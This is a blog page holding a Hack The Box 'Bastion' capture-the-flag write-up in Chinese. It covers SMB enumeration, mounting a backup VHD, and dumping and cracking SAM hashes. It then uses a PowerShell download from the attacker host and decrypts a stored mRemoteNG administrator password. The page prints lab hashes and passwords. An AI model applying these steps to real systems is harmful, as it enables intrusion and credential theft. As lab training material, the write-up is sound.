<!DOCTYPE html><html lang="en"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><title>HTB Bastion Writeup · Ikonw</title><meta name="description" content="HTB Bastion Writeup - Ikonw"><meta name="viewport" content="width=device-width, initial-scale=1"><link rel="icon" href="/favicon.ico"><link rel="stylesheet" href="/css/gandalfr.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/styles/solarized-light.min.css"><link rel="search" type="application/opensearchdescription+xml" href="http://example.com/atom.xml" title="Ikonw"><meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Ikonw" type="application/atom+xml">
</head><body><div class="wrap"><header><a href="/" class="logo-link"><img src="https://p4.itc.cn/q_70/images03/20230225/87c56a7134574d718cd48f0955a962f4.png" alt="logo"></a><ul class="nav nav-list"><li class="nav-list-item"><a href="/" target="_self" class="nav-list-link">BLOG</a></li><li class="nav-list-item"><a href="/archives/" target="_self" class="nav-list-link">ARCHIVE</a></li><li class="nav-list-item"><a href="/atom.xml" target="_self" class="nav-list-link">RSS</a></li><!-- Search Bar--><li style="margin-top: 10px;" class="nav-list-item"><form action="/search" method="GET"><input type="text" name="query" placeholder="Search" style="padding: 8px; border: 1px solid #ccc; border-radius: 4px; margin-right: 5px; width: 200px;"><button type="submit" style="padding: 8px 12px; border: none; border-radius: 4px; background-color: #007bff; color: white; cursor: pointer;"> </button></form></li></ul></header><main class="container"><div class="post"><article class="post-block"><h1 class="post-title">HTB Bastion Writeup</h1><div class="tags"><a href="/tags/hackthebox/" class="tag-title">#hackthebox</a></div><div class="post-info">Jan 10, 2020</div><div class="post-content"><p>攻击机：官方Kali linux 2019 64位<br>作者: <strong>Ikonw</strong></p>
<p><img src="/images/HTB-bastion/image-20200924210807049.png" alt="image-20200924210807049"></p>
<h2 id="一，端口扫描"><a href="#一，端口扫描" class="headerlink" title="一，端口扫描"></a>一，端口扫描</h2><p><img src="/images/HTB-bastion/image-20200924210826254.png" alt="image-20200924210826254"></p>
<p>正常的nmap端口扫描 没有太多的资讯，只有SMB和SSH 开着。</p>
<h2 id="二，SMB-Enumeration"><a href="#二，SMB-Enumeration" class="headerlink" title="二，SMB Enumeration"></a>二，SMB Enumeration</h2><p>首先，利用smbclient 连接到靶机<br>方式有很多种， smbmap之类的 但我比较喜欢用简单的smbclient.<br>smbmap等其他工具在真实环境里 会自动进行大量操作，很容易被日志捕捉下来。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient -L //10.10.10.134</span><br></pre></td></tr></table></figure>

<p><img src="/images/HTB-bastion/image-20200924210848265.png" alt="image-20200924210848265"></p>
<p>发现四个目标，其中三个是比较正常。<br>有意思的是 <strong>Backups</strong></p>
<p>我们利用smbclient 看看是否允许我们连接到 <strong>Backups</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbclient \\\\10.10.10.134\\Backups</span><br></pre></td></tr></table></figure>

<p>这里利用””来 逃脱 “” 所以需要4个，而backup 两个。</p>
<p><img src="/images/HTB-bastion/image-20200924210918572.png" alt="image-20200924210918572"></p>
<p><img src="/images/HTB-bastion/2020011001300488.png" alt="asd"></p>
<p>成功进入，发现三个文件。利用 <strong>get</strong> 把 <strong>note.txt</strong> 下载到本地。<br>大概的意思就是 系统管理员建议不要把整个backup 文件夹下载到本地。<br>按照文件夹的名字来看，应该是windows镜像的备份。</p>
<p><img src="/images/HTB-bastion/20200110013425912.png" alt="asdf"></p>
<p>于是我尝试将整个backup都挂载到本地。<br>在本地创建文件夹 <strong>&#x2F;mnt&#x2F;backup</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mount -t cifs //10.10.10.134/Backups /mnt/backup -o rw</span><br></pre></td></tr></table></figure>

<p>挂载到本地并且允许读写操作</p>
<p><img src="/images/HTB-bastion/20200110013652862.png" alt="在这asd述"></p>
<p>7z 有一个功能是可以让你直接读取 vhd文件的格式。我们直接来读取5gb的文件<br>(文件较大 大概2分钟左右， 文件较多就只展示一部分）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">7z l 9b9cfbc4-369e-11e9-a17c-806e6f6e6963.vhd</span><br></pre></td></tr></table></figure>

<p><img src="/images/HTB-bastion/20200110014239133.png" alt="在fdsaf"></p>
<p>可以看到这是几乎整个windows的备份。<br>既然是windows备份 我们是不是可以从SAM File里面直接提取用户的帐号密码呢</p>
<h2 id="三，用户帐号密码"><a href="#三，用户帐号密码" class="headerlink" title="三，用户帐号密码"></a>三，用户帐号密码</h2><p>7z 只是让我们看到了文件，而不能看到内容。<br>我稍微google 了一下，发现一个兄弟在medium上面有篇文章利用ghost-mount挂载虚拟硬盘。<br>linux的 ghostmount 能让我们进入虚拟硬盘的文件</p>
<p>链接: <a target="_blank" rel="noopener" href="https://medium.com/@klockw3rk/mounting-vhd-file-on-kali-linux-through-remote-share-f2f9542c1f25">文章地址</a></p>
<p>跟着大哥走<br>首先我们需要<strong>安装 libguestfs-tools</strong>这个库</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install libguestfs-tools</span><br></pre></td></tr></table></figure>

<p>简单的安装后，我们创建一个新的文件夹 <strong>&#x2F;mnt&#x2F;vhd</strong></p>
<p>把vhd挂载在 这个文件夹</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">guestmount --add /mnt/backup/WindowsImageBackup/L4mpje-PC/Backup\ 2019-02-22\ 124351/9b9cfbc4-369e-11e9-a17c-806e6f6</span><br></pre></td></tr></table></figure>

<p><img src="/images/HTB-bastion/20200110015004404.png" alt="在asdasd"></p>
<p>可以看到已经可以进入到 vhd文件里进行操作。<br>我首先要做的就是能不能直接到user desktop里拿到 user.txt</p>
<p>samdump2可以完成这个任务</p>
<p><img src="/images/HTB-bastion/20200110015521278.png" alt="在这asdasd"></p>
<p>关于哈希值的利用方法很多，既然SMB是开着的 完全可以用哈希值传递攻击 登录系统。<br>个人原因 我比较喜欢尝试破解密码</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">*disabled* Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">*disabled* Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::</span><br><span class="line">L4mpje:1000:aad3b435b51404eeaad3b435b51404ee:26112010952d963c8dc4217daec986d9:::</span><br><span class="line">123</span><br></pre></td></tr></table></figure>

<p>注意这边 administrator和 Guest显得的是 <strong>disable</strong><br>正常来说格式是<br>&lt;用户名&gt;:&lt;用户ID&gt;:&lt; LM hash&gt;:&lt; NT hash&gt;:&lt;留言&gt;:&lt;主目录&gt;<br>Administrator和guest的 LM HASH和NT hash都是一模一样。<br>这边要注意 aad3 和 31d6 都是代表为空说明这里没有数值<br>题外话。</p>
<p>我们把L4mpje 的哈希值丢到crackstation.net 进行破解<br>得到帐号密码<br>L4mpje：bureaulampje</p>
<p><img src="/images/HTB-bastion/20200110020035505.png" alt="在这sadad"></p>
<p>很可惜 我们没有 RDP， 但我们有SSH（狗头）</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ssh L4mpje@10.10.10.134</span><br><span class="line">password: bureaulampje</span><br><span class="line">12</span><br></pre></td></tr></table></figure>

<p>成功拿到 cmd shell<br><img src="/images/HTB-bastion/20200110020241609.png" alt="在这里插入图片描述"><br><img src="/images/HTB-bastion/20200110020309865.png" alt="在这里插入图片描述"><br>现在开始准备提权。<br>碰到windows 我个人习惯是上JAWL 的脚本来看系统的信息来帮助我提权。</p>
<p>链接: <a target="_blank" rel="noopener" href="https://github.com/411Hall/JAWS">Jawl github地址</a></p>
<p>因为这是我的第一个文章 我就简单的说下 如何在windows里传输文件<br>其实方式有很多种，<br>有的情况这个可以 有的情况那个可以<br>我就简单说一下 我个人喜爱的一个方法。<br><strong>powershell</strong></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -c <span class="string">&quot;(new-object System.Net.WebClient).DownloadFile(&#x27;http://10.10.14.12/jaw</span></span><br><span class="line"><span class="string">s-enum.ps1&#x27;,&#x27;C:\Users\L4mpje\Desktop\jaws-enum.ps1&#x27;)</span></span><br><span class="line"><span class="string">12</span></span><br></pre></td></tr></table></figure>

<p>题外话结束</p>
<p>执行jaws-enum.ps1</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1</span><br><span class="line">1</span><br></pre></td></tr></table></figure>

<p>大概的看了下 并没有什么有趣的信息，但有一个地方引起了关注<br><strong>mRemoteNG</strong><br><img src="/images/HTB-bastion/20200110020826900.png" alt="在这里插入图片描述"></p>
<h2 id="四，提权"><a href="#四，提权" class="headerlink" title="四，提权"></a>四，提权</h2><p>碰到陌生的软件就要上Google询问，果然我们发现了这软件存在比较弱的密码保护管理。<br><img src="/images/HTB-bastion/20200110021000221.png" alt="在这里插sad"><br>在另外一篇文章里 我们发现了储存密码的目录 是位于Appdata里。</p>
<p>链接:<a target="_blank" rel="noopener" href="http://hackersvanguard.com/mremoteng-insecure-password-storage/">文章传送门</a></p>
<p><img src="/images/HTB-bastion/20200110021043792.png" alt="asdf"><br>这里再说点题外话。<br>Appdata属于隐藏的文件夹类型 正常的dir 是无法看见文件夹</p>
<p><img src="/images/HTB-bastion/20200110021237568.png" alt="sadfasdfaf"></p>
<p>利用 <strong>dir&#x2F;a</strong> 来显示全部的文件</p>
<p><img src="/images/HTB-bastion/20200110021316395.png" alt="asdf"></p>
<p>成功找到管理员的密码</p>
<p><img src="/images/HTB-bastion/20200110021405254.png" alt="a"></p>
<p>利用github上面的一个python 脚本 来算出密码</p>
<p>链接:github传送门</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python3 mremote_decrypt.py -s <span class="string">&quot;aEWNFV5uGcjUHF0uS17QTdT9kVqtKCPeoC0Nw5dmaPFjNQ2kt/zO5xDqE4HdVmHAowVRdC7emf7lWWA10dQKiw==&quot;</span></span><br><span class="line"></span><br><span class="line">成功取得密码</span><br><span class="line">thXLHM96BeKL0ER2</span><br><span class="line">1234</span><br></pre></td></tr></table></figure>

<p><img src="/images/HTB-bastion/20200110021514274.png" alt="在这里插入图片描述"></p>
<p>紧接着 SSH登陆管理员 并拿到root.txt</p>
<p><img src="/images/HTB-bastion/20200110021619237.png" alt="在这里插入图片描述"></p>
<br/>
<br/>
<br/>

<p><img src="/images/root.gif" alt="root"></p>
</div></article></div></main><footer><div class="paginator"><a href="/2020/01/13/HTB-wall/" class="prev">PREV</a></div><div class="copyright"><p>© 2019 - 2023 <a href="http://example.com">Ikonw</a>, powered by <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/MikeCoder/hexo-theme-gandalfr" target="_blank">hexo-theme-gandalfr</a>.</p></div></footer></div><script src="//cdn.bootcss.com/mathjax/2.7.0/MathJax.js?config=TeX-MML-AM_CHTML" integrity="sha384-crwIf/BuaWM9rM65iM+dWFldgQ1Un8jWZMuh3puxb8TOY9+linwLoI7ZHZT+aekW" crossorigin="anonymous"></script><script src="//cdnjs.cloudflare.com/ajax/libs/highlight.js/9.13.1/highlight.min.js" crossorigin="anonymous"></script><script src="//cdn.bootcss.com/jquery/3.1.1/jquery.js" crossorigin="anonymous"></script><script>$(document).ready(function() { hljs.configure({useBR: true}); $('pre').each(function(i, block) { hljs.highlightBlock(block); }); });</script></body></html>